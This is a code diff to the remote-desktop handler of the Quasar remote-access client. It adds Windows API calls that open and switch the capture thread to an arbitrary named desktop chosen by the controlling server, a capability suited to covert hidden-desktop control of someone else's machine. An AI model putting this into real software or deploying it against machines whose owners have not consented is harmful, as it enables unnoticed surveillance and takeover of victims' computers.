@@ -12,11 +12,38 @@ using System.Windows.Forms;
 
 using InputInterceptorNS;
 using Quasar.Client.Interception;
+using System.Runtime.InteropServices;
+using System.Security.AccessControl;
+using NAudio.Utils;
+using Quasar.Client.Networking;
 
 namespace Quasar.Client.Messages
 {
     public class RemoteDesktopHandler : NotificationMessageProcessor, IDisposable
     {
+
+
+        // Import the necessary functions from user32.dll
+
+
+        [DllImport("user32.dll")]
+        private static extern bool CloseDesktop(IntPtr hDesktop);
+
+        [DllImport("user32.dll")]
+        private static extern bool SetThreadDesktop(IntPtr hDesktop);
+
+        [DllImport("user32.dll")]
+        private static extern IntPtr GetThreadDesktop(uint dwThreadId);
+
+        [DllImport("kernel32.dll")]
+        private static extern uint GetCurrentThreadId();
+
+        [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+        public static extern IntPtr OpenDesktop(string lpszDesktop, uint dwFlags, bool fInherit, uint dwDesiredAccess);
+
+        private const uint DESKTOP_READOBJECTS = 0x0001;
+        private const uint GENERIC_ALL = 0x10000000;
+
         private UnsafeStreamCodec _streamCodec;
 
         public override bool CanExecute(IMessage message) => message is GetDesktop ||
@@ -47,6 +74,31 @@ namespace Quasar.Client.Messages
 
         private void Execute(ISender client, GetDesktop message)
         {
+            try
+            {
+                Networking.Client clientRef = (Networking.Client)client;
+                if (message.DesktopName != clientRef.curDesktopName)
+                {
+                    if (clientRef.curDesktop.ToInt64() != 0L)
+                    {
+                        CloseDesktop(clientRef.curDesktop);
+                    }
+                    IntPtr hDesktop = OpenDesktop(message.DesktopName, 0U, false, GENERIC_ALL);
+                    if(hDesktop != IntPtr.Zero)
+                    {
+                        clientRef.curDesktop = hDesktop;
+                        client.Send(new NotifyMessageToServer { Message = $"Desktop is changed from {clientRef.curDesktopName} to {message.DesktopName}" });
+                    }
+                    clientRef.curDesktopName = message.DesktopName;
+                }
+                if(clientRef.curDesktop != IntPtr.Zero) SetThreadDesktop(clientRef.curDesktop);
+            }
+            catch (Exception ex)
+            {
+                client.Send(new NotifyMessageToServer { Message = "Thread Dekstop Change Error: " + ex.Message });
+            }
+
+
             // TODO: Switch to streaming mode without request-response once switched from windows forms
             // TODO: Capture mouse in frames: https://stackoverflow.com/questions/6750056/how-to-capture-the-screen-and-mouse-pointer-using-windows-apis
             var monitorBounds = ScreenHelper.GetBounds((message.DisplayIndex));
@@ -59,7 +111,7 @@ namespace Quasar.Client.Messages
             {
                 _streamCodec?.Dispose();
                 _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
-                OnReport("Remote desktop session started");
+                OnReport("Remote desktop session started");                
             }
 
             if (_streamCodec.ImageQuality != message.Quality || _streamCodec.Monitor != message.DisplayIndex || _streamCodec.Resolution != resolution)
@@ -93,7 +145,7 @@ namespace Quasar.Client.Messages
                     });
                 }
             }
-            catch (Exception)
+            catch (Exception ex)
             {
                 if (_streamCodec != null)
                 {
@@ -106,6 +158,7 @@ namespace Quasar.Client.Messages
                     });
                 }
 
+                client.Send(new NotifyMessageToServer { Message = "Exception while screen cpaturing: " + ex.Message });
                 _streamCodec = null;
             }
             finally
